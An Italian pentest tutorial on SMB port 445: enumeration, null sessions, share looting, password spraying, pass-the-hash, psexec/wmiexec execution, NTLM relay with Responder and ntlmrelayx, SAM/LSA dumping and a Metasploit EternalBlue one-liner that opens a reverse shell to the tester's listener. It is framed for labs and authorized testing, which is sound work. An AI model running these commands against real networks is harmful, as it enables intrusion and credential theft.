---
title: 'SMB Porta 445 Windows: Cos''è, Enumerazione e Pentest'
slug: smb
description: 'Protocollo SMB 445: che porta usa, differenza con la 139, share, server Samba su Linux, mount, null session, signing, relay NTLM, EternalBlue, Pass-the-Hash.'
image: /smb-port-445-ethical-hacking-guide.webp
draft: false
date: 2026-02-01T00:00:00.000Z
categories:
  - windows
subcategories:
  - active-directory
tags:
  - SMB
  - Porta 445
  - Enumerazione SMB
  - EternalBlue
  - Pentest SMB
---

# Porta 445 SMB: Guida Completa a Enumerazione, Attacchi e Difesa

**La porta 445 è la porta TCP che Windows usa per SMB** (`Server Message Block`, il significato è: protocollo a blocchi di messaggi per file, stampanti e comunicazione tra computer): condivisione di file e stampanti, named pipe, RPC e autenticazione (NTLM o Kerberos) su un'unica connessione, senza passare dal vecchio NetBIOS della [porta 139](https://hackita.it/articoli/porta-139-netbios-session/). In una rete Active Directory è il canale per share, sessioni, esecuzione remota e movimento laterale: per questo, in un pentest interno, è quasi sempre il primo servizio che guardi.

La porta aperta non è una vulnerabilità. Il rischio dipende da versione SMB, signing, autenticazione, permessi delle share e dalle protezioni di rete. Questa guida è per lab, CTF (Hack The Box, OSCP, OSEP) e pentest autorizzati, e insegna a **verificare** ogni condizione prima di trarre conclusioni. Salta alla [cheat sheet finale](#cheat-sheet-finale) o al [laboratorio](#laboratorio-furto-di-hash-con-ntlm_theft-e-responder) in fondo.

**Risposta rapida:** scopri chi ha la 445 aperta, controlla dialect e signing, prova l'accesso anonimo, enumera share e utenti con credenziali valide, poi valuta relay, esecuzione remota e vulnerabilità legacy. Ogni passo ha un risultato da interpretare, non solo un comando da lanciare.

## SMB in Una Riga

`445/TCP` = file sharing + named pipe + RPC + autenticazione NTLM/Kerberos. Superficie d'attacco: share, sessioni, credenziali, signing, versioni legacy.

## Cos'è SMB: Protocollo, Versioni, CIFS e Samba

SMB è un protocollo client-server: un client chiede a un server di leggere, scrivere o aprire file, e di usare servizi come stampanti e named pipe. È nato negli anni Ottanta in IBM ed è diventato lo standard di Windows per la condivisione di rete. Oggi lo trovi su Windows, Linux (via Samba), macOS e su molti NAS.

Tre nomi che si confondono spesso:

| Nome                          | Cos'è                                                                                                                                                                                        |
| ----------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| SMB                           | Il protocollo, in più versioni (SMB1, SMB2, SMB3)                                                                                                                                            |
| `Common Internet File System` | Il significato è: file system comune per Internet. È il nome (CIFS) dato alle versioni SMB1. Resta nel comando `mount -t cifs`, ma oggi quel modulo del kernel Linux parla anche SMB2 e SMB3 |
| Samba                         | Il software open source che implementa SMB su Linux e Unix: fa da file server, può fare da membro o controller di dominio e include i tool client (`smbclient`)                              |

Quindi: **SMB è il protocollo, CIFS è il vecchio nome di SMB1, Samba è il programma che lo parla su Linux.** Per un pentester questo conta perché lo stesso servizio sulla 445 può essere un Windows Server o un Samba su Linux, e le vulnerabilità sono diverse (vedi la sezione su Samba più avanti).

### SMB1 vs SMB2 vs SMB3

Le tre generazioni del protocollo non sono intercambiabili: cambiano sicurezza, prestazioni e superficie d'attacco.

| Versione                 | Anno / sistemi                                                                    | Cosa cambia                                                               | Rilevanza offensiva                                                                                                           |
| ------------------------ | --------------------------------------------------------------------------------- | ------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------- |
| **SMB1**                 | Windows 2000-XP/2003, disattivato di default da Windows 8.1/Server 2012 R2 in poi | Protocollo chatty, nessuna cifratura nativa, named pipe legacy            | Target di EternalBlue (MS17-010); se lo trovi attivo è quasi sempre un sistema molto vecchio o reintrodotto per compatibilità |
| **SMB2 / SMB2.1**        | Vista/Server 2008 e successivi                                                    | Meno round-trip, signing migliorato, durable handles                      | Il signing diventa lo strumento di difesa principale contro il relay                                                          |
| **SMB3 / 3.0.2 / 3.1.1** | Windows 8/Server 2012 e successivi                                                | Encryption end-to-end, multichannel, pre-authentication integrity (3.1.1) | Con `EncryptData` attivo il traffico non è più sniffabile nemmeno con un signing debole                                       |

Verifica la versione negoziata, non quella massima supportata: un client vecchio può forzare il fallback a un dialect più debole se il server lo accetta.

```bash
nmap -p 445 -Pn --script smb-protocols 10.10.10.10
```

## Le Porte Legate a SMB

| Porta                                                              | Servizio               | Note                                    |
| ------------------------------------------------------------------ | ---------------------- | --------------------------------------- |
| 445/TCP                                                            | SMB diretto su TCP     | Quella moderna: parti sempre da qui     |
| [139/TCP](https://hackita.it/articoli/porta-139-netbios-session/)  | SMB su NetBIOS Session | Legacy, presente per compatibilità      |
| [137/UDP](https://hackita.it/articoli/porta-137-netbios/)          | NetBIOS Name Service   | Risoluzione nomi, utile per `nbtscan`   |
| [138/UDP](https://hackita.it/articoli/porta-138-netbios-datagram/) | NetBIOS Datagram       | Raro nelle reti moderne                 |
| [135/TCP](https://hackita.it/articoli/porta-135-rpc/)              | RPC Endpoint Mapper    | Usata da WMI/DCOM, spesso insieme a SMB |

Non ogni sistema Windows espone la 445: dipendono servizio, ruolo, regole firewall e rete.

## Come Verificare se la Porta 445 è Aperta

Prima di tutto controlla che la porta risponda, e cosa gira davvero dietro: la 445 non significa automaticamente Windows, può essere Samba, un NAS o un'appliance.

```bash
# Quick TCP check from Linux
nc -vz 10.10.10.50 445

# Nmap: open, closed or filtered, plus service/version fingerprint
nmap -p 445 -Pn -sV 10.10.10.50
```

```powershell
# Quick check from Windows
Test-NetConnection -ComputerName 10.10.10.50 -Port 445
```

Come leggere il risultato di nmap:

| Stato      | Significato                                                |
| ---------- | ---------------------------------------------------------- |
| `open`     | Qualcosa risponde sulla 445: procedi con il fingerprint    |
| `closed`   | L'host è raggiungibile ma non c'è servizio                 |
| `filtered` | Un firewall scarta i pacchetti: non sai se il servizio c'è |

Una 445 `open` su un host esposto a Internet è già un risultato da riportare nel report: SMB non dovrebbe essere raggiungibile da fuori. Quasi tutte le grandi campagne di scanning di massa (incluso WannaCry nel 2017) hanno usato proprio l'esposizione della 445 su Internet come vettore iniziale.

## Anatomia di una Sessione SMB

1. **TCP handshake** su 445
2. **Negotiate**: client e server scelgono il dialect (2.0.2, 2.1, 3.0, 3.0.2, 3.1.1; SMBv1 se ancora attivo)
3. **Session Setup**: autenticazione [NTLM](https://hackita.it/articoli/ntlm/) o [Kerberos](https://hackita.it/articoli/kerberos/)
4. **Tree Connect**: connessione a una share (`\\host\share`)
5. **Operazioni**: lettura, scrittura, named pipe via `IPC$` (da cui passa l'RPC per utenti, gruppi, policy)

## Admin Shares: C$, ADMIN$ e IPC$

Ogni sistema Windows crea alcune share automaticamente. Riconoscerle ti dice subito che ruolo ha l'host, e sono il punto da cui passano quasi tutte le tecniche di questa guida.

| Share         | A cosa serve                                                  | Chi la vede                             |
| ------------- | ------------------------------------------------------------- | --------------------------------------- |
| `C$`, `D$`... | Radice del disco                                              | Solo amministratori                     |
| `ADMIN$`      | Cartella di Windows (`C:\Windows`): è da qui che passa psexec | Solo amministratori                     |
| `IPC$`        | Named pipe e RPC, non è una cartella                          | Anche anonimi, se la policy lo permette |
| `NETLOGON`    | Script di logon                                               | Domain controller                       |
| `SYSVOL`      | Policy di gruppo (GPO) e script                               | Domain controller                       |
| `print$`      | Driver di stampa                                              | Server con stampanti condivise          |

**Perché `IPC$` conta per primo.** `IPC$`, il significato è: Inter-Process Communication, non contiene file: è il canale su cui viaggiano le named pipe (`\pipe\lsarpc`, `\pipe\samr`, `\pipe\srvsvc`) con cui [rpcclient](https://hackita.it/articoli/rpcclient/) ed [enum4linux-ng](https://hackita.it/articoli/enum4linux-ng/) interrogano utenti, gruppi e policy. Una sessione su `IPC$`, anche anonima, è il prerequisito per quasi tutta l'enumerazione RPC vista più avanti.

```bash
# IPC$ enumeration: open the session, then query users and groups over it
smbclient -N //10.10.10.50/IPC$ -c exit && echo "IPC\$ session OK"
rpcclient -U "" -N 10.10.10.50 -c "enumdomusers"
```

Se `ADMIN$` o `C$` rispondono con `READ` o `WRITE` per un utente non previsto, sei già amministratore locale su quella macchina: è il requisito per [psexec](https://hackita.it/articoli/psexec/) e [smbexec](https://hackita.it/articoli/smbexec/) (Fase 7).

## Strumenti per l'Enumerazione SMB

| Tool                                                        | A cosa serve                                                                                                                | Guida                                                       |
| ----------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------- |
| `nmap`                                                      | Scoperta, dialect, signing, script di vulnerabilità                                                                         | [nmap](https://hackita.it/articoli/nmap/)                   |
| [NetExec](https://hackita.it/articoli/netexec/) (`nxc`)     | Panoramica di rete, share, utenti, spray, esecuzione. Sostituisce [CrackMapExec](https://hackita.it/articoli/crackmapexec/) | [NetExec](https://hackita.it/articoli/netexec/)             |
| [smbclient](https://hackita.it/articoli/smbclient/)         | Client interattivo: lista share, scarica e carica file                                                                      | [smbclient](https://hackita.it/articoli/smbclient/)         |
| [smbmap](https://hackita.it/articoli/smbmap/)               | Permessi per share, contenuto ricorsivo                                                                                     | [smbmap](https://hackita.it/articoli/smbmap/)               |
| [enum4linux-ng](https://hackita.it/articoli/enum4linux-ng/) | Enumerazione automatica di share, utenti, gruppi, policy                                                                    | [enum4linux-ng](https://hackita.it/articoli/enum4linux-ng/) |
| [rpcclient](https://hackita.it/articoli/rpcclient/)         | Query RPC su utenti, gruppi, SID                                                                                            | [rpcclient](https://hackita.it/articoli/rpcclient/)         |
| [Impacket](https://hackita.it/articoli/impacket/)           | Esecuzione remota, relay, dump credenziali                                                                                  | [Impacket](https://hackita.it/articoli/impacket/)           |

Parti da `nxc` e `nmap` per la mappa, poi scendi con `smbmap`, `smbclient` e `rpcclient` sui singoli host.

## SMB Enumeration: Cheat Sheet per Fase

Prima di entrare nel dettaglio di ogni fase, questa è la mappa completa di cosa enumerare e con cosa. È la stessa progressione che segui in un pentest reale: da nessuna credenziale a dump completo.

| Cosa enumeri            | Senza credenziali                                                                             | Con credenziali                                     |
| ----------------------- | --------------------------------------------------------------------------------------------- | --------------------------------------------------- |
| Host e versione OS      | `nmap -p 445 -sV --script smb-os-discovery`                                                   | Stesso comando, più dettagliato con sessione valida |
| Dialect e signing       | `nmap --script smb-protocols,smb2-security-mode`                                              | Uguale                                              |
| Share disponibili       | `smbclient -N -L //target`, `smbmap -u '' -p ''`                                              | `smbmap -u user -p pass -H target`                  |
| Contenuto delle share   | Solo se il permesso anonimo lo consente                                                       | `smbmap -r SHARE --depth 3`, `smbclient` con `mget` |
| Utenti del dominio      | `enum4linux-ng -U`, `rpcclient -U "" -N` con `enumdomusers` (se la null session RPC è aperta) | `nxc smb target -u user -p pass --users`            |
| Gruppi                  | Come sopra con `enumdomgroups`                                                                | `nxc smb target -u user -p pass --groups`           |
| Policy password/lockout | `rpcclient` con `getdompwinfo` (se consentito)                                                | `nxc smb target -u user -p pass --pass-pol`         |
| Sessioni attive         | `nmap --script smb-enum-sessions` (spesso richiede auth)                                      | `nxc smb target -u user -p pass -M enum_av`         |
| Vulnerabilità note      | `nmap --script smb-vuln-ms17-010,smb-vuln-cve-2020-0796`                                      | Uguale, più accurato con fingerprint OS confermato  |

Le colonne "senza credenziali" dipendono dal fatto che l'host accetti sessioni anonime: su un Domain Controller moderno spesso rispondono solo `NT_STATUS_ACCESS_DENIED`, e devi passare alla colonna con credenziali, anche a bassi privilegi.

### Nmap: gli NSE script che contano

Oltre ai tre script citati nella Fase 1, questi coprono il resto dell'enumerazione SMB via NSE:

```bash
# Shares, users, groups and sessions in one pass (needs working credentials for most hosts)
nmap -p 445 --script smb-enum-shares,smb-enum-users,smb-enum-groups,smb-enum-sessions,smb-enum-domains --script-args smbusername=jsmith,smbpassword=Password1 10.10.10.50

# Vulnerability scanners
nmap -p 445 --script smb-vuln-ms17-010,smb-vuln-cve-2020-0796,smb-vuln-cve2009-3103 10.10.10.50
```

`smb-enum-shares` e `smb-enum-users` spesso restituiscono poco senza autenticazione: è normale, non un errore del comando. Confrontali sempre con l'output di `nxc` o `enum4linux-ng`, che gestiscono meglio i fallback.

## Fase 1: Rilevamento e Fingerprint

```bash
# Who has 445 open
nmap -p 445 --open -Pn 10.10.10.0/24 -oG smb_hosts.txt

# Host, OS, domain, dialect and signing
nmap -p 445 -Pn --script smb-os-discovery,smb-protocols,smb2-security-mode 10.10.10.10

# Network overview with NetExec
nxc smb 10.10.10.0/24
```

Output di esempio di NetExec (illustrativo):

```text
SMB   10.10.10.10  445  DC01      [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:corp.local) (signing:True) (SMBv1:False)
SMB   10.10.10.20  445  WS-DEV01  [*] Windows 11 Build 22631 x64 (name:WS-DEV01) (domain:corp.local) (signing:False) (SMBv1:False)
SMB   10.10.10.50  445  SRV-FILE  [*] Windows Server 2019 Build 17763 x64 (name:SRV-FILE) (domain:corp.local) (signing:False) (SMBv1:False)
```

Cosa leggere: nome e dominio, OS e build, `signing`, `SMBv1`. È già una mappa: DC con signing richiesto, altri host da controllare. Se trovi `crackmapexec` in vecchi lab o write-up, è il predecessore di NetExec: i comandi di questa guida usano `nxc`.

Per risolvere i nomi NetBIOS di una subnet: [nbtscan](https://hackita.it/articoli/nbtscan/).

## Fase 2: Dialect e Signing

```bash
nmap -p 445 -Pn --script smb-protocols,smb2-security-mode 10.10.10.20
```

```text
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
```

`smb2-security-mode` controlla il signing sui server SMB2/SMB3. Il vecchio `smb-security-mode` riguarda il modello legacy (SMBv1): non usarlo come controllo principale.

| Risultato                                    | Significato                                             |
| -------------------------------------------- | ------------------------------------------------------- |
| `signing:True` / "required"                  | Il relay SMB verso quell'host non funziona              |
| `signing:False` / "enabled but not required" | Segnale di rischio, **non** prova che un relay riuscirà |
| `SMBv1:True`                                 | Protocollo legacy attivo: controlla le patch (MS17-010) |

Il default dipende da versione e ruolo. I domain controller richiedono normalmente il signing. Windows 11 24H2 (Pro, Enterprise, Education) e Windows Server 2025 hanno default più restrittivi di prima, con differenze tra connessioni in entrata e in uscita. Non generalizzare: **verifica sul sistema effettivo**.

Lista dei target senza signing (utile per il relay):

```bash
nxc smb 10.10.10.0/24 --gen-relay-list relay_targets.txt
```

### Signing e Encryption: non sono la stessa cosa

|                    | Signing                                                                | Encryption                             |
| ------------------ | ---------------------------------------------------------------------- | -------------------------------------- |
| Cosa protegge      | Che il messaggio non sia stato modificato e arrivi dal mittente giusto | Che nessuno possa leggere il contenuto |
| Disponibile da     | SMB 2                                                                  | SMB 3.0                                |
| Contro il relay    | Sì: è la difesa principale                                             | Non è la misura pensata per questo     |
| Contro lo sniffing | No: il traffico resta leggibile                                        | Sì                                     |

Per bloccare il relay serve il **signing richiesto**. Per proteggere i dati che passano in rete serve l'**encryption**. Un buon hardening li usa entrambi dove servono.

## Fase 3: Accesso Anonimo (Null Session e Guest Access)

Il test cerca di capire cosa si ottiene senza credenziali. Una `null session` (il significato è: sessione nulla, cioè connessione con utente e password vuoti) e una sessione guest sono due cose diverse: la prima usa credenziali vuote, la seconda l'account Guest.

```bash
smbclient -N -L //10.10.10.50
smbmap -H 10.10.10.50 -u '' -p ''
smbmap -H 10.10.10.50 -u guest
nxc smb 10.10.10.50 -u '' -p '' --shares
nxc smb 10.10.10.50 -u 'guest' -p '' --shares
rpcclient -U "" -N 10.10.10.50
enum4linux-ng -A 10.10.10.50
```

Strumenti: [smbclient](https://hackita.it/articoli/smbclient/), [smbmap](https://hackita.it/articoli/smbmap/), [rpcclient](https://hackita.it/articoli/rpcclient/), [enum4linux-ng](https://hackita.it/articoli/enum4linux-ng/).

Output di esempio di `smbmap` (illustrativo, sessione anonima):

```text
[+] IP: 10.10.10.50:445  Name: SRV-FILE.corp.local
    Disk        Permissions   Comment
    ----        -----------   -------
    ADMIN$      NO ACCESS     Remote Admin
    C$          NO ACCESS     Default share
    IPC$        READ ONLY     Remote IPC
    Public      READ, WRITE   Public Documents
    IT-Deploy   READ ONLY     IT Deployment Scripts
```

Come interpretarlo:

| Risultato                    | Cosa dimostra                                    | Cosa non dimostra                            |
| ---------------------------- | ------------------------------------------------ | -------------------------------------------- |
| Elenco share anonimo         | Il server consente la sessione senza credenziali | Che i file contengano segreti                |
| `IPC$` leggibile             | Parte dell'RPC può rispondere                    | Che utenti e gruppi siano enumerabili        |
| `Public: READ, WRITE`        | Accesso con **quell'identità**                   | I permessi NTFS reali sui file (vedi Fase 4) |
| `NT_STATUS_ACCESS_DENIED`    | Autenticazione rifiutata o accesso negato        | Che la share non esista                      |
| `NT_STATUS_BAD_NETWORK_NAME` | Quella share non esiste                          |                                              |
| `NT_STATUS_LOGON_FAILURE`    | Credenziali non valide                           |                                              |

Un risultato negativo non prova che non esista nulla: con un'identità valida l'esito può cambiare. Registra sempre **quale identità** ha fatto il test. Su Windows Server 2016+ la null session è disattivata di default; se funziona, è quasi sempre una misconfigurazione da riportare.

## Fase 4: Share, Permessi e File Sensibili

Una share ha tre livelli di permesso da non confondere: permessi della **share**, permessi **NTFS** su file e cartelle, e permessi **effettivi** dell'identità che usi. `READ, WRITE` in `smbmap` indica il test fatto con quell'utente; non dice tutto il resto.

```bash
# Share list with credentials
smbmap -H 10.10.10.50 -u jsmith -p 'Password1' -d corp.local
nxc smb 10.10.10.50 -u jsmith -p 'Password1' --shares

# Recursive listing of a share
smbmap -H 10.10.10.50 -u jsmith -p 'Password1' -r IT-Deploy --depth 3

# Interactive shell and download
smbclient //10.10.10.50/IT-Deploy -U 'corp.local\jsmith%Password1'
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *

# Mount the share on Linux
sudo mount -t cifs //10.10.10.50/IT-Deploy /mnt/share -o username=jsmith,domain=corp.local

# Spider with NetExec
nxc smb 10.10.10.50 -u jsmith -p 'Password1' -M spider_plus
```

Per automatizzare la ricerca nelle share esiste anche Snaffler (Windows). Cosa cercare:

| File / posizione                           | Perché                                                               |
| ------------------------------------------ | -------------------------------------------------------------------- |
| `*.config`, `web.config`, `*.ini`, `*.xml` | Connection string, service account                                   |
| `*.ps1`, `*.bat`, `*.vbs`                  | Script di deployment con credenziali                                 |
| `Registry.xml`, `Unattend.xml`             | Autologon, installazioni automatiche                                 |
| `SYSVOL\...\Groups.xml`                    | GPP con `cpassword`: la chiave è pubblica, la password è decifrabile |
| `*.kdbx`, backup, dump                     | Archivi di credenziali o dati                                        |

```bash
# Example: GPP cpassword in SYSVOL
smbclient //10.10.10.10/SYSVOL -U 'corp.local\jsmith%Password1' -c "recurse ON; prompt OFF; mget *"
grep -ri "cpassword" corp.local/
gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
```

Il valore nell'esempio è il `cpassword` pubblicato da Microsoft nella documentazione: ti mostra come funziona la decifratura. Il vecchio problema GPP (MS14-025) è stato corretto: nelle reti aggiornate di solito non trovi più nuovi `cpassword`, ma file storici restano comuni nei lab.

## Fase 5: Utenti, Gruppi e Policy

```bash
rpcclient -U 'corp.local\jsmith%Password1' 10.10.10.10
rpcclient $> enumdomusers
rpcclient $> querydispinfo
rpcclient $> enumdomgroups
rpcclient $> getdompwinfo

nxc smb 10.10.10.10 -u jsmith -p 'Password1' --users
nxc smb 10.10.10.10 -u jsmith -p 'Password1' --groups
nxc smb 10.10.10.10 -u jsmith -p 'Password1' --pass-pol
nxc smb 10.10.10.10 -u jsmith -p 'Password1' --rid-brute

lookupsid.py corp.local/jsmith:'Password1'@10.10.10.10
```

[lookupsid](https://hackita.it/articoli/lookupsid/) e `--rid-brute` ricostruiscono gli utenti dai RID (500, 501, 1000+) anche quando l'enumerazione diretta è limitata. La policy (`--pass-pol`, `getdompwinfo`) ti dà soglia di lockout e finestra di reset: **leggila prima** di qualsiasi spray.

Output di esempio (illustrativo):

```text
[+] Password Policy:
    Minimum length: 8
    Lockout threshold: 5
    Lockout observation window: 30 minutes
```

Un'appartenenza a un gruppo privilegiato è un'ipotesi di lavoro, non una conclusione. Esempio: `Backup Operators` ha `SeBackupPrivilege`, che permette di leggere file ignorando le ACL (per esempio copiare hive del registro). **Non equivale a DCSync**, che richiede i diritti di replica AD (*Replicating Directory Changes* e *Replicating Directory Changes All*, e in alcuni casi *In Filtered Set*). Sono percorsi diversi: vedi [DCSync](https://hackita.it/articoli/dcsync/) e [BloodHound](https://hackita.it/articoli/bloodhound/) per mappare i diritti reali.

## Fase 6: Autenticazione, Spray e Pass-the-Hash

### Password spraying

```bash
nxc smb 10.10.10.10 -u users.txt -p 'Spring2026!' --continue-on-success
```

Una password per ciclo, sotto la soglia di lockout letta nella Fase 5, poi aspetta la finestra di osservazione. Approfondimento: [Password Spraying](https://hackita.it/articoli/password-spraying/). Per il brute force su un singolo utente: [Hydra](https://hackita.it/articoli/hydra/).

### Pass-the-Hash

Con un hash **NT** (32 caratteri) valido puoi autenticarti senza la password. Negli esempi uso `8846f7eaee8fb117ad06bdd830b7586c`, l'hash NT della password `password`, buono per un lab. L'hash `31d6cfe0d16ae931b73c59d7e0c089c0` invece è quello di una password **vuota**.

```bash
# NetExec: NT hash only
nxc smb 10.10.10.50 -u administrator -H 8846f7eaee8fb117ad06bdd830b7586c --shares

# Impacket: LM:NT format, LM can be empty
impacket-psexec corp.local/administrator@10.10.10.50 -hashes :8846f7eaee8fb117ad06bdd830b7586c
```

```text
SMB  10.10.10.50  445  SRV-FILE  [+] corp.local\administrator:8846f7eaee8fb117ad06bdd830b7586c (Pwn3d!)
```

`Pwn3d!` indica che l'identità ha diritti amministrativi locali su quell'host. Se vedi `STATUS_LOGON_FAILURE`, l'hash può essere sbagliato o l'account bloccato; un hash NetNTLMv2 catturato con Responder **non** è un hash NT e non si usa per PtH (si cracka o si rilancia). Guida completa: [Pass-the-Hash](https://hackita.it/articoli/pass-the-hash/).

### Kerberos

```bash
smbclient --kerberos //ws01.corp.local/C$
nxc smb 10.10.10.50 -u jsmith -p 'Password1' -k
```

Con Kerberos usa il FQDN, non l'IP.

## Fase 7: Esecuzione Remota e Movimento Laterale via SMB

Servono credenziali (o hash) con diritti amministrativi sul target. Ogni metodo ha requisiti e tracce diverse: questa è la comparazione da tenere a mente prima di scegliere.

| Tool                                              | Come funziona                                          | Velocità | Rumore | Note                                                                    |
| ------------------------------------------------- | ------------------------------------------------------ | -------- | ------ | ----------------------------------------------------------------------- |
| [psexec](https://hackita.it/articoli/psexec/)     | Carica un binario su `ADMIN$`, crea un servizio        | Media    | Alto   | Shell SYSTEM; evento di nuovo servizio, spesso bloccato da AV           |
| [smbexec](https://hackita.it/articoli/smbexec/)   | Servizio che esegue comandi e scrive l'output su share | Media    | Medio  | Meno binari su disco di psexec                                          |
| [wmiexec](https://hackita.it/articoli/wmiexec/)   | WMI/DCOM per eseguire comandi                          | Alta     | Basso  | Usa la 135 e porte RPC dinamiche oltre alla 445; nessun servizio creato |
| [atexec](https://hackita.it/articoli/atexec/)     | Task Scheduler                                         | Bassa    | Medio  | Un comando alla volta                                                   |
| [dcomexec](https://hackita.it/articoli/dcomexec/) | Oggetti DCOM                                           | Alta     | Basso  | Alternativa a WMI                                                       |
| `nxc -x`                                          | Wrapper che sceglie il metodo per te                   | Alta     | Varia  | Comodo per test rapidi su molti host                                    |

```bash
impacket-psexec corp.local/administrator:'Password1'@10.10.10.50
impacket-wmiexec corp.local/administrator:'Password1'@10.10.10.50
nxc smb 10.10.10.50 -u administrator -p 'Password1' -x whoami
nxc smb 10.10.10.50 -u administrator -p 'Password1' -X '$PSVersionTable'
```

```text
[-] SMB SessionError: STATUS_ACCESS_DENIED
```

`ACCESS_DENIED` su `ADMIN$` significa di solito che l'utente non è admin locale sul target. Non esiste un metodo "invisibile": nessun file su disco non equivale a nessuna telemetria (vedi la sezione Detection). Quadro generale: [Impacket](https://hackita.it/articoli/impacket/), [Lateral Movement](https://hackita.it/articoli/lateral-movement/).

## Fase 8: SMB Relay e NTLM Relay

Il relay inoltra un'autenticazione NTLM in transito verso un altro servizio. Il solo `signing:False` **non basta**. Servono tutte queste condizioni:

* Un'autenticazione NTLM effettivamente catturabile (Responder, coercizione, file malevolo su una share)
* Un target che accetta NTLM e non richiede signing (SMB) o protezioni equivalenti (LDAP signing, channel binding, EPA per HTTP/LDAPS)
* L'identità rilanciata deve avere i privilegi necessari: un machine account (`DC01$`) non è admin locale su un file server per default
* Il relay verso lo stesso host di origine è bloccato

```bash
# 1. Targets without signing
nxc smb 10.10.10.0/24 --gen-relay-list relay_targets.txt

# 2. Responder with SMB and HTTP off (in Responder.conf: SMB = Off, HTTP = Off)
sudo responder -I tun0

# 3. Relay
impacket-ntlmrelayx -tf relay_targets.txt -smb2support
```

```text
[*] SMBD-Thread-5: Received connection from 10.10.10.20, attacking target smb://10.10.10.50
[*] Authenticating against smb://10.10.10.50 as CORP/JSMITH SUCCEED
[*] Dumping local SAM hashes
```

```text
[-] Signing is required for 10.10.10.10, skipping
```

Cosa NON confondere: `--delegate-access` è una modalità legata al relay verso **LDAP/LDAPS** (delega RBCD con un computer account), non un effetto della lista di host SMB. Un relay LDAP dipende da LDAP signing e channel binding. Guida: [NTLM Relay](https://hackita.it/articoli/ntlm-relay/), [Responder](https://hackita.it/articoli/responder/), [ESC8 (relay verso ADCS)](https://hackita.it/articoli/esc8-adcs/).

**Furto di hash con file su share scrivibili.** Se una share è scrivibile, un file con un percorso UNC (`.scf`, `.lnk`, `.url`, o generato da `ntlm_theft`) fa autenticare chi lo apre verso il tuo host. Con Responder catturi un hash NetNTLMv2 da crackare con [Hashcat](https://hackita.it/articoli/hashcat/) (`-m 5600`) o da rilanciare. Funziona solo se qualcuno apre quella cartella e l'host può raggiungere il tuo listener. La procedura completa passo passo è nel [laboratorio](#laboratorio-furto-di-hash-con-ntlm_theft-e-responder) in fondo.

**Coercizione.** Tecniche come PetitPotam o PrinterBug forzano un host a autenticarsi verso di te. Alcune sono state mitigate con le patch: verifica sempre stato e versione nel lab.

## Fase 9: Vulnerabilità SMB, Legacy e Recenti

| Vulnerabilità                  | Riferimento                                       | Condizione                                                                                                                       |
| ------------------------------ | ------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------- |
| EternalBlue                    | MS17-010                                          | SMBv1, sistema non patchato                                                                                                      |
| MS08-067                       | [MS08-067](https://hackita.it/articoli/ms08-067/) | Windows 2000/XP/2003 non patchati                                                                                                |
| SMBGhost                       | CVE-2020-0796                                     | SMB 3.1.1 con compressione, Windows 10 1903/1909 non patchato                                                                    |
| NTLM reflection sul client SMB | CVE-2025-33073                                    | Windows non aggiornato a giugno 2025 e senza signing richiesto: un utente di dominio può ottenere SYSTEM su quell'host           |
| Fuga di hash da `.library-ms`  | CVE-2025-24054                                    | Windows non aggiornato a marzo 2025: aprire o estrarre un file `.library-ms` fa partire un'autenticazione SMB verso l'attaccante |
| SambaCry                       | CVE-2017-7494                                     | Samba da 3.5.0 fino alle versioni prima di 4.6.4, 4.5.10 e 4.4.14, con share scrivibile (vedi la sezione Samba)                  |

SMBv1 attivo è un prerequisito rilevante, ma **non basta**: contano patch e sistema reale. Prima rileva, poi (solo nel lab) valuta l'exploit.

**EternalBlue e WannaCry.** MS17-010 è il bollettino Microsoft, EternalBlue l'exploit (sviluppato dalla NSA e diffuso nel leak Shadow Brokers del 2017), WannaCry il ransomware che lo ha usato per diffondersi in tutto il mondo nel maggio 2017. Oggi lo trovi quasi solo in lab e macchine CTF, ma resta l'esempio didattico migliore di cosa succede quando SMBv1 resta esposto e non patchato.

CVE-2025-33073 è un buon esempio di perché il signing resta centrale: la falla è stata corretta con gli aggiornamenti di giugno 2025, ma sugli host senza signing richiesto il rischio di relay e reflection resta alto anche dopo. CVE-2025-24054 invece mostra come una vecchia idea (file che puntano a un percorso UNC) continui a funzionare in forme nuove: per questo la difesa non è solo la patch, ma anche limitare l'NTLM in uscita verso l'esterno.

```bash
nmap -p 445 -Pn --script smb-vuln-ms17-010 10.10.10.40
```

```text
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
```

```bash
# Non-invasive check in Metasploit, then the exploit
msfconsole -q -x "use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS 10.10.10.40; run"
msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.10.10.40; set LHOST tun0; run"
```

Se l'exploit fallisce, prima di cambiare modulo controlla architettura, named pipe disponibili e stato delle patch: un modulo alternativo non è una soluzione universale. Vedi [Metasploit](https://hackita.it/articoli/metasploit/) e [msfconsole](https://hackita.it/articoli/msfconsole/). Se la 445 non è raggiungibile per colpa del firewall, il percorso è un [pivot](https://hackita.it/articoli/pivoting/) da una subnet autorizzata.

## Fase 10: Dopo l'Accesso

Con diritti amministrativi sul target:

```bash
impacket-secretsdump corp.local/administrator:'Password1'@10.10.10.50
nxc smb 10.10.10.50 -u administrator -p 'Password1' --sam
nxc smb 10.10.10.50 -u administrator -p 'Password1' --lsa
```

Approfondimenti: [secretsdump](https://hackita.it/articoli/secretsdump/), [Credential Dumping](https://hackita.it/articoli/credential-dumping/), [Mimikatz](https://hackita.it/articoli/mimikatz/), [Credential Harvesting](https://hackita.it/articoli/credential-harvesting/). Dal lato Active Directory, il quadro è in [Active Directory](https://hackita.it/articoli/active-directory/).

## Montare una Share SMB su Linux, Windows e macOS

Serve spesso nei lab, quando vuoi lavorare sui file di una share come se fossero locali.

**Linux (Ubuntu, Debian, Kali):**

```bash
sudo apt install cifs-utils
sudo mkdir -p /mnt/share
sudo mount -t cifs //10.10.10.50/IT-Deploy /mnt/share -o username=jsmith,domain=corp.local,vers=3.0
ls /mnt/share
sudo umount /mnt/share
```

